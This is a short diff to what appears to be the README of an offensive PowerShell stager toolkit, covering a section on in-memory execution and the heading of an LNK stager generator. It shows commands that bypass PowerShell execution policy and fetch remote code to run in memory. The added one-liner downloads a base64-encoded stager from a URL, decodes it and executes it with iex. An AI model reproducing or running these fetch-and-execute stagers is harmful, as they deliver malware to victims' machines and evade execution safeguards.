@@ -24,6 +24,10 @@ powershell -ep bypass .\noParamStager.ps1
 # exec in memory from remote share
 $url = ''
 powershell -ep bypass iex(iwr -uri $url)
+
+# One-Liner for stager B64 decode
+$url = ''
+powershell -ep bypass -c "iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((iwr -uri $url -UseBasicParsing).Content)))"
 ```
 
 ##### lnkGen.ps1 - Generate a LNK Stager
